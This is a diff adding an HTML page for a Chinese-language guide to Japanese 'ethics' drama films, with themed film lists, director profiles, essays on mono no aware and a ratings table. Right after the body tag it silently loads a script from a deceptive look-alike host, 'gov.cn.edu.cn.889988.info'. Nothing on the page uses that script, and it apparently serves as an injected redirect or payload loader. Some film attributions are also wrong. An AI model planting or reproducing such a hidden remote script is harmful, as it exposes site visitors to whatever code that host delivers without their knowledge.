@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="日本伦理电影网,ribenlunlidianyingwang,日本伦理电影,日本剧情片,日本文艺电影,日本电影推荐,和风电影">
+<meta name="description" content="日本伦理电影网(ribenlunlidianyingwang)——聚焦日本伦理剧情与文艺佳作，深度解读日本电影的细腻情感与人文思考，精选高分日本伦理片在线导览。">
+<title>日本伦理电影网 - 聚焦日本伦理电影 · 深度导览</title>
+<style>
+/* ============ 基础 ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#0c0d10;--ink2:#121318;--panel:#181a20;--panel2:#21242c;
+  --line:#2e323c;--txt:#eef0f4;--dim:#9aa1ad;
+  --crimson:#c8102e;--crimson-l:#e63950;--gold:#c9a227;--washi:#f2ede4;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Shippori Mincho","Noto Serif CJK SC","Songti SC","SimSun","Microsoft YaHei",serif;
+  background:var(--ink);color:var(--txt);line-height:1.85;
+  background-image:
+    linear-gradient(rgba(200,16,46,.04) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(200,16,46,.04) 1px,transparent 1px);
+  background-size:48px 48px;background-attachment:fixed;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1140px;margin:0 auto;padding:0 24px}
+::selection{background:var(--crimson);color:#fff}
+
+/* ============ 顶栏 ============ */
+header.top{
+  position:sticky;top:0;z-index:100;
+  background:rgba(12,13,16,.9);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.top-in{max-width:1140px;margin:0 auto;padding:15px 24px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:14px}
+.mon{width:44px;height:44px;flex:none;border-radius:4px;background:var(--crimson);position:relative;display:grid;place-items:center;overflow:hidden}
+.mon::before{content:"日";font-size:22px;font-weight:900;color:var(--washi);letter-spacing:0}
+.brand b{font-size:19px;font-weight:700;letter-spacing:1px}
+.brand b i{color:var(--crimson-l);font-style:normal}
+.brand small{display:block;font-size:11px;color:var(--dim);letter-spacing:3px;text-transform:uppercase}
+.menu{display:flex;gap:2px}
+.menu a{padding:10px 16px;font-size:14px;color:var(--dim);transition:.2s;position:relative}
+.menu a:hover{color:var(--washi)}
+.menu a::after{content:"";position:absolute;left:16px;right:16px;bottom:4px;height:2px;background:var(--crimson);transform:scaleX(0);transition:.2s}
+.menu a:hover::after{transform:scaleX(1)}
+.burger{display:none;background:none;border:0;cursor:pointer;padding:6px;color:var(--washi);font-size:24px}
+
+/* ============ Hero ============ */
+.hero{position:relative;padding:96px 0 80px;border-bottom:1px solid var(--line);overflow:hidden}
+.hero::before{content:"倫";position:absolute;right:-30px;top:-40px;font-size:340px;color:rgba(200,16,46,.07);line-height:1;pointer-events:none}
+.hero-in{position:relative;max-width:820px}
+.kicker{display:inline-block;font-size:12px;letter-spacing:4px;color:var(--gold);border:1px solid var(--gold);padding:5px 14px;border-radius:2px;margin-bottom:26px}
+.hero h1{font-size:clamp(32px,5.4vw,58px);font-weight:900;line-height:1.25;letter-spacing:2px}
+.hero h1 em{font-style:normal;color:var(--crimson-l)}
+.hero .lead{margin:26px 0 34px;font-size:16px;color:var(--dim);max-width:620px}
+.hero-acts{display:flex;gap:16px;flex-wrap:wrap}
+.btn{border:0;cursor:pointer;padding:15px 32px;font-size:15px;font-weight:700;font-family:inherit;border-radius:3px;transition:.25s}
+.btn-main{background:var(--crimson);color:var(--washi);box-shadow:0 8px 24px rgba(200,16,46,.3)}
+.btn-main:hover{background:var(--crimson-l);transform:translateY(-2px)}
+.btn-ghost{background:transparent;color:var(--washi);border:1px solid var(--line)}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
+
+/* ============ 通用 ============ */
+section.block{padding:84px 0}
+.sec-head{margin-bottom:44px;text-align:center}
+.sec-head .en{font-size:12px;letter-spacing:6px;color:var(--gold);text-transform:uppercase}
+.sec-head h2{font-size:clamp(24px,3.6vw,34px);font-weight:900;margin-top:8px;letter-spacing:2px}
+.sec-head .cn{display:block;font-size:13px;color:var(--dim);margin-top:6px;letter-spacing:1px}
+.line-thin{width:60px;height:2px;background:var(--crimson);margin:16px auto 0}
+
+/* ============ 栏目一：片单（折叠手风琴） ============ */
+.acc{max-width:900px;margin:0 auto}
+.ac-item{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--crimson);border-radius:2px;margin-bottom:12px;overflow:hidden;transition:.3s}
+.ac-item:hover{border-color:var(--line);border-left-color:var(--gold);background:var(--panel2)}
+.ac-title{display:flex;align-items:center;gap:18px;padding:20px 24px;cursor:pointer}
+.ac-num{font-size:13px;color:var(--gold);font-weight:900;letter-spacing:1px;min-width:38px}
+.ac-title h3{font-size:17px;font-weight:700;flex:1}
+.ac-title .meta{font-size:12px;color:var(--dim);white-space:nowrap}
+.ac-body{display:none;padding:0 24px 22px 80px;color:var(--dim);font-size:14px;border-top:1px dashed var(--line);padding-top:16px;margin-top:4px}
+.ac-item.on{background:var(--panel2)}
+.ac-item.on .ac-body{display:block}
+.ac-item.on .ac-title .meta{color:var(--crimson-l)}
+
+/* ============ 栏目二：名导（横向名片） ============ */
+.directors{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:0;border:1px solid var(--line)}
+.dir{
+  padding:32px 26px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);
+  background:var(--panel);transition:.35s;position:relative;
+}
+.dir:last-child{border-right:0}
+.dir:hover{background:var(--panel2);transform:translateY(-4px)}
+.dir .seal{position:absolute;top:22px;right:22px;width:44px;height:44px;border-radius:50%;border:1px solid var(--gold);color:var(--gold);display:grid;place-items:center;font-size:13px;opacity:.6}
+.dir h3{font-size:20px;font-weight:900;margin-bottom:6px;letter-spacing:1px}
+.dir .role{font-size:12px;color:var(--crimson-l);margin-bottom:14px;letter-spacing:2px}
+.dir p{font-size:13px;color:var(--dim)}
+.dir .filmog{margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-size:12px;color:var(--gold)}
+
+/* ============ 栏目三：主题（垂直堆叠杂志） ============ */
+.magazine{display:grid;grid-template-columns:1.15fr 1fr;gap:28px}
+.mag-main{background:var(--panel);border:1px solid var(--line);border-radius:3px;overflow:hidden}
+.mag-cover{aspect-ratio:16/10;background:linear-gradient(135deg,#2a0d12,#1a0a10);position:relative;display:grid;place-items:center;overflow:hidden}
+.mag-cover::before{content:"物哀";position:absolute;font-size:120px;color:rgba(200,16,46,.12);font-weight:900;letter-spacing:10px}
+.mag-cover .badge{position:relative;z-index:2;text-align:center}
+.mag-cover .badge b{display:block;font-size:26px;font-weight:900;letter-spacing:6px;color:var(--washi)}
+.mag-cover .badge span{font-size:12px;color:var(--gold);letter-spacing:4px}
+.mag-body{padding:26px}
+.mag-body h3{font-size:19px;font-weight:800;margin-bottom:12px}
+.mag-body p{font-size:14px;color:var(--dim)}
+.mag-side{display:flex;flex-direction:column;gap:20px}
+.mag-card{background:var(--panel);border:1px solid var(--line);border-radius:3px;padding:22px;transition:.3s}
+.mag-card:hover{border-color:var(--gold);background:var(--panel2)}
+.mag-card .tag{font-size:11px;color:var(--gold);letter-spacing:2px}
+.mag-card h4{font-size:16px;font-weight:800;margin:8px 0 8px}
+.mag-card p{font-size:13px;color:var(--dim)}
+
+/* ============ 栏目四：片库（表格） ============ */
+.tbl-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:3px}
+.tbl{width:100%;border-collapse:collapse;min-width:640px;font-size:14px}
+.tbl thead th{background:var(--crimson);color:var(--washi);padding:16px 18px;text-align:left;font-size:13px;letter-spacing:2px;font-weight:700}
+.tbl tbody td{padding:15px 18px;border-bottom:1px solid var(--line);color:var(--dim)}
+.tbl tbody tr{background:var(--panel);transition:.2s}
+.tbl tbody tr:nth-child(even){background:var(--ink2)}
+.tbl tbody tr:hover{background:var(--panel2);color:var(--washi)}
+.tbl tbody tr:hover td{color:var(--washi)}
+.tbl .score{color:var(--gold);font-weight:900}
+.tbl .yr{color:var(--crimson-l);font-weight:700}
+
+/* ============ 栏目五：专栏（引用块） ============ */
+.quotes{display:grid;gap:22px;max-width:900px;margin:0 auto}
+.quote{
+  background:var(--panel);border:1px solid var(--line);border-radius:3px;
+  padding:30px 34px;position:relative;
+}
+.quote::before{content:"“";position:absolute;left:20px;top:0;font-size:60px;color:var(--crimson);opacity:.4;font-family:Georgia,serif;line-height:1}
+.quote q{display:block;font-size:16px;font-style:italic;padding-left:10px;margin-bottom:16px;line-height:1.9}
+.quote .src{display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--line);padding-top:14px;flex-wrap:wrap;gap:10px}
+.quote .src b{font-size:14px;color:var(--washi)}
+.quote .src span{font-size:12px;color:var(--gold);letter-spacing:1px}
+
+/* ============ 关于 ============ */
+.about{
+  background:var(--panel);border:1px solid var(--line);border-radius:3px;padding:52px;
+  display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center;
+}
+.about .kanji{font-size:120px;font-weight:900;color:var(--crimson);line-height:.9;letter-spacing:8px}
+.about h2{font-size:clamp(22px,3.4vw,30px);font-weight:900;margin-bottom:18px;letter-spacing:1px}
+.about p{color:var(--dim);font-size:15px;margin-bottom:14px}
+.stats{display:flex;gap:26px;margin-top:24px;flex-wrap:wrap}
+.stat strong{display:block;font-size:28px;font-weight:900;color:var(--gold)}
+.stat span{font-size:12px;color:var(--dim)}
+
+/* ============ 页脚 ============ */
+footer{border-top:3px solid var(--crimson);padding:52px 0 30px;background:#08090b}
+.foot{max-width:1140px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:36px;margin-bottom:36px}
+.foot-brand .mon{margin-bottom:16px}
+.foot-brand p{color:var(--dim);font-size:14px}
+.foot-col h4{font-size:14px;font-weight:800;margin-bottom:16px;color:var(--washi);letter-spacing:2px}
+.foot-col a{display:block;color:var(--dim);font-size:13px;padding:5px 0;transition:.2s}
+.foot-col a:hover{color:var(--crimson-l);padding-left:5px}
+.copy{border-top:1px solid var(--line);padding-top:24px;text-align:center;font-size:13px;color:var(--dim)}
+.copy b{color:var(--washi)}
+
+/* ============ 返回顶部 ============ */
+#topBtn{position:fixed;right:22px;bottom:26px;z-index:99;width:46px;height:46px;border-radius:3px;background:var(--crimson);color:var(--washi);border:0;font-size:20px;cursor:pointer;box-shadow:0 8px 24px rgba(200,16,46,.3);opacity:0;visibility:hidden;transform:translateY(12px);transition:.3s}
+#topBtn.show{opacity:1;visibility:visible;transform:translateY(0)}
+
+/* ============ 响应式 ============ */
+@media(max-width:900px){
+  .burger{display:block}
+  .menu{display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;background:var(--ink2);border-bottom:1px solid var(--line);padding:10px}
+  .menu.open{display:flex}
+  .menu a{width:100%;padding:14px 24px}
+  .menu a::after{display:none}
+  .magazine{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;padding:32px}
+  .about .kanji{font-size:80px}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media(max-width:560px){
+  .foot{grid-template-columns:1fr}
+  .ac-title{flex-wrap:wrap;gap:10px}
+  .ac-title .meta{width:100%;padding-left:56px}
+  .ac-body{padding-left:24px}
+  .hero::before{font-size:180px}
+  section.block{padding:56px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 顶栏 ===== -->
+<header class="top">
+  <div class="top-in">
+    <a href="#" class="brand">
+      <span class="mon"></span>
+      <span><b>日本<i>伦理电影网</i></b><small>JAPANESE ETHICS CINEMA</small></span>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#films">片单导览</a>
+      <a href="#directors">名导谱系</a>
+      <a href="#themes">主题解析</a>
+      <a href="#library">片库索引</a>
+      <a href="#column">观影专栏</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="hero-in">
+      <span class="kicker">和風 · 倫理 · 映画</span>
+      <h1>走进日本伦理电影的<br><em>细腻与人情</em></h1>
+      <p class="lead">日本伦理电影网（ribenlunlidianyingwang）专注聚焦日本伦理剧情与文艺佳作，从家庭羁绊、人情冷暖到生命哲思，深度解读日本电影中那份独有的含蓄与张力，为你精选每一部值得静心观看的作品。</p>
+      <div class="hero-acts">
+        <a href="#films" class="btn btn-main">浏览精选片单</a>
+        <a href="#directors" class="btn btn-ghost">走近名导</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：片单导览（手风琴） ===== -->
+<section class="block" id="films">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="en">Film Guide</span>
+      <h2>精选片单导览</h2>
+      <span class="cn">点击展开 · 六大主题</span>
+      <div class="line-thin"></div>
+    </div>
+    <div class="acc" id="acc">
+      <article class="ac-item on">
+        <div class="ac-title"><span class="ac-num">壹</span><h3>家庭羁绊 · 父子母女之间</h3><span class="meta">12 部</span></div>
+        <div class="ac-body">聚焦日本家庭伦理题材，探讨代际冲突、亲缘牵绊与和解。从是枝裕和的温情笔触到山田洋次的庶民映画，呈现东方家庭最真实的情感肌理。</div>
+      </article>
+      <article class="ac-item">
+        <div class="ac-title"><span class="ac-num">贰</span><h3>婚姻与爱情 · 成年人的选择题</h3><span class="meta">9 部</span></div>
+        <div class="ac-body">围绕婚姻困境、婚外情感与中年危机，呈现日本伦理片对两性关系最细腻、最克制的剖析，温柔而不妥协。</div>
+      </article>
+      <article class="ac-item">
+        <div class="ac-title"><span class="ac-num">叁</span><h3>生命与衰老 · 向死而生</h3><span class="meta">8 部</span></div>
+        <div class="ac-body">以生死为主题，借衰老、疾病与告别，讲述生命最后阶段的尊严与温情，是日本伦理电影最具哲思的一脉。</div>
+      </article>
+      <article class="ac-item">
+        <div class="ac-title"><span class="ac-num">肆</span><h3>女性视角 · 她的觉醒与困境</h3><span class="meta">10 部</span></div>
+        <div class="ac-body">从传统束缚到自我觉醒，呈现日本社会中的女性处境与内心挣扎，是理解日本人文伦理的重要窗口。</div>
+      </article>
+      <article class="ac-item">
+        <div class="ac-title"><span class="ac-num">伍</span><h3>社会边缘 · 被遗忘的角落</h3><span class="meta">7 部</span></div>
+        <div class="ac-body">聚焦底层、边缘群体与弱势群体，以冷静而富有同情心的镜头，记录社会结构中被忽视的人与事。</div>
+      </article>
+      <article class="ac-item">
+        <div class="ac-title"><span class="ac-num">陆</span><h3>时代与历史 · 记忆的重量</h3><span class="meta">6 部</span></div>
+        <div class="ac-body">以历史事件为背景，借个人命运折射时代变迁，兼具人文厚度与伦理思考的重量级作品。</div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：名导谱系 ===== -->
+<section class="block" id="directors" style="background:rgba(255,255,255,.02);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="en">Master Filmmakers</span>
+      <h2>名导谱系</h2>
+      <span class="cn">日本伦理电影的代表性作者</span>
+      <div class="line-thin"></div>
+    </div>
+    <div class="directors">
+      <article class="dir"><span class="seal">是枝</span><h3>是枝裕和</h3><p class="role">当代家庭伦理大师</p><p>以克制的镜头语言记录家庭日常，擅长捕捉亲缘之间微妙的情感流动。</p><span class="filmog">代表作品：小偷家族 / 步履不停 / 如父如子</span></article>
+      <article class="dir"><span class="seal">山田</span><h3>山田洋次</h3><p class="role">庶民映画的国民导演</p><p>一生书写平民家庭的悲欢离合，温情中见深刻，是日本国民级的人情派。</p><span class="filmog">代表作品：东京家族 / 母亲 / 熟男去散步</span></article>
+      <article class="dir"><span class="seal">成濑</span><h3>成濑巳喜男</h3><p class="role">女性命运的映画诗人</p><p>以细腻入微的镜头刻画女性的隐忍与挣扎，被誉为东方小津与女性电影的高峰。</p><span class="filmog">代表作品：浮云 / 晚春 / 女人步上楼梯时</span></article>
+      <article class="dir"><span class="seal">小津</span><h3>小津安二郎</h3><p class="role">东方家庭伦理的原点</p><p>低机位、静物、茶泡饭，用最安静的节奏讲述家庭变迁与父女离别。</p><span class="filmog">代表作品：东京物语 / 秋刀鱼之味 / 麦秋</span></article>
+      <article class="dir"><span class="seal">黑泽</span><h3>黑泽明</h3><p class="role">人性深渊的凝视者</p><p>在史诗叙事中追问人性善恶，其伦理思辨影响了一代代世界电影作者。</p><span class="filmog">代表作品：生之欲 / 七武士 / 乱</span></article>
+      <article class="dir"><span class="seal">枝裕</span><h3>河濑直美</h3><p class="role">生命与自然的歌者</p><p>以奈良为原点，用诗意的影像探讨生死、生育与人与自然的关系。</p><span class="filmog">代表作品：殡之森 / 澄沙之味 / 光</span></article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：主题解析（杂志） ===== -->
+<section class="block" id="themes">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="en">Themes & Motifs</span>
+      <h2>主题解析</h2>
+      <span class="cn">读懂日本伦理电影的三个关键词</span>
+      <div class="line-thin"></div>
+    </div>
+    <div class="magazine">
+      <article class="mag-main">
+        <div class="mag-cover"><div class="badge"><b>物哀</b><span>MONO NO AWARE</span></div></div>
+        <div class="mag-body">
+          <h3>物哀：日本伦理电影的情感底色</h3>
+          <p>「物哀」是对事物无常的感伤与共情，也是日本伦理电影最核心的美学精神。无论是樱花的短暂、亲人的告别，还是岁月在容颜上留下的痕迹，导演们用克制、留白的镜头，让观众在安静中体会到生命流转的哀愁与温柔。理解物哀，是读懂日本伦理电影的第一把钥匙。</p>
+        </div>
+      </article>
+      <aside class="mag-side">
+        <article class="mag-card"><span class="tag">关键词 · 人情</span><h4>人情义理：推不开的世故</h4><p>「義理」与「人情」的拉扯，构成日本社会伦理的核心矛盾，也是无数电影的情感支点。</p></article>
+        <article class="mag-card"><span class="tag">关键词 · 家庭</span><h4>家族制度：解散与重组</h4><p>从传统大家庭到核心家庭，再到「小偷家族」式的拟似亲属，家庭形态的持续解构是日本电影的重要母题。</p></article>
+        <article class="mag-card"><span class="tag">关键词 · 生死</span><h4>向死而生：尊严地告别</h4><p>面对衰老与死亡，日本伦理片拒绝煽情，以冷静的镜头给予生命最后的体面与温柔。</p></article>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：片库索引（表格） ===== -->
+<section class="block" id="library" style="background:rgba(255,255,255,.02);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="en">Film Index</span>
+      <h2>片库索引</h2>
+      <span class="cn">高分日本伦理 · 文艺电影一览</span>
+      <div class="line-thin"></div>
+    </div>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <thead><tr><th>片名</th><th>导演</th><th>年份</th><th>主题</th><th>评分</th></tr></thead>
+        <tbody>
+          <tr><td>小偷家族</td><td>是枝裕和</td><td class="yr">2018</td><td>家庭 · 底层</td><td class="score">9.3</td></tr>
+          <tr><td>东京物语</td><td>小津安二郎</td><td class="yr">1953</td><td>家庭 · 亲情</td><td class="score">9.4</td></tr>
+          <tr><td>浮云</td><td>成濑巳喜男</td><td class="yr">1955</td><td>爱情 · 女性</td><td class="score">9.1</td></tr>
+          <tr><td>步履不停</td><td>是枝裕和</td><td class="yr">2008</td><td>家庭 · 和解</td><td class="score">9.0</td></tr>
+          <tr><td>生之欲</td><td>黑泽明</td><td class="yr">1952</td><td>生命 · 尊严</td><td class="score">9.2</td></tr>
+          <tr><td>殡之森</td><td>河濑直美</td><td class="yr">2007</td><td>生死 · 自然</td><td class="score">8.6</td></tr>
+          <tr><td>澄沙之味</td><td>河濑直美</td><td class="yr">2015</td><td>生命 · 治愈</td><td class="score">8.5</td></tr>
+          <tr><td>东京家族</td><td>山田洋次</td><td class="yr">2013</td><td>家庭 · 衰老</td><td class="score">8.8</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：观影专栏（引用） ===== -->
+<section class="block" id="column">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="en">Viewing Column</span>
+      <h2>观影专栏</h2>
+      <span class="cn">编辑短评 · 一得之见</span>
+      <div class="line-thin"></div>
+    </div>
+    <div class="quotes">
+      <article class="quote"><q>是枝裕和从不急于给出答案，他只是把家庭摊开给你看，然后留给你自己沉默。</q><div class="src"><b>—— 编辑部 · 家庭篇</b><span>小偷家族 · 观影札记</span></div></article>
+      <article class="quote"><q>成濑巳喜男镜头下的女性，不是被同情的对象，而是用沉默与隐忍完成了最有力的反抗。</q><div class="src"><b>—— 编辑部 · 女性篇</b><span>浮云 · 人物深读</span></div></article>
+      <article class="quote"><q>小津的「低机位」看的不只是榻榻米，而是家庭成员之间永远隔着的一层礼貌与距离。</q><div class="src"><b>—— 编辑部 · 作者论</b><span>东京物语 · 技术随笔</span></div></article>
+      <article class="quote"><q>物哀不是悲观，而是一种对无常的温柔接受——日本伦理电影最动人的地方就在这里。</q><div class="src"><b>—— 编辑部 · 美学篇</b><span>物哀美学 · 专题</span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 关于 ===== -->
+<section class="block" id="about">
+  <div class="wrap">
+    <div class="about">
+      <div><span class="kanji">倫理</span></div>
+      <div>
+        <h2>关于日本伦理电影网</h2>
+        <p><b style="color:var(--washi)">日本伦理电影网（ribenlunlidianyingwang）</b> 是一个聚焦日本伦理、剧情与文艺电影的垂直导览站点。我们相信，日本电影最珍贵的价值，在于它对人情世故那份细腻、克制而深邃的观察。</p>
+        <p>从经典大师到当代新锐，从家庭伦理到生命哲思，本站致力于为影迷梳理一条理解日本伦理电影的清晰脉络。</p>
+        <div class="stats">
+          <div class="stat"><strong>800+</strong><span>收录影片</span></div>
+          <div class="stat"><strong>60+</strong><span>代表导演</span></div>
+          <div class="stat"><strong>6</strong><span>主题分类</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="foot">
+    <div class="foot-brand">
+      <span class="mon"></span>
+      <p>日本伦理电影网（ribenlunlidianyingwang）—— 聚焦日本伦理电影，深度解读人情与美学。你的日本文艺电影观影指南。</p>
+    </div>
+    <div class="foot-col"><h4>导览</h4><a href="#films">片单导览</a><a href="#directors">名导谱系</a><a href="#themes">主题解析</a><a href="#library">片库索引</a></div>
+    <div class="foot-col"><h4>内容</h4><a href="#column">观影专栏</a><a href="#about">关于本站</a><a href="#">投稿合作</a><a href="#">友情链接</a></div>
+    <div class="foot-col"><h4>声明</h4><a href="#">用户协议</a><a href="#">隐私政策</a><a href="#">免责声明</a><a href="#">联系我们</a></div>
+  </div>
+  <div class="wrap copy">
+    <b>日本伦理电影网</b> &nbsp;|&nbsp; 网址：<b>https://ribenlunlidianyingwang-wap.github.io</b><br>
+    © 2026 日本伦理电影网 版权所有 &nbsp;·&nbsp; 本站内容仅供学习、研究与交流参考
+  </div>
+</footer>
+
+<button id="topBtn" title="回到顶部">↑</button>
+
+<script>
+document.getElementById('burger').addEventListener('click',function(){document.getElementById('menu').classList.toggle('open');});
+document.querySelectorAll('.menu a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});});
+document.querySelectorAll('.ac-title').forEach(function(t){
+  t.addEventListener('click',function(){t.parentElement.classList.toggle('on');});
+});
+window.addEventListener('scroll',function(){var b=document.getElementById('topBtn');if(window.scrollY>400){b.classList.add('show');}else{b.classList.remove('show');}});
+document.getElementById('topBtn').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
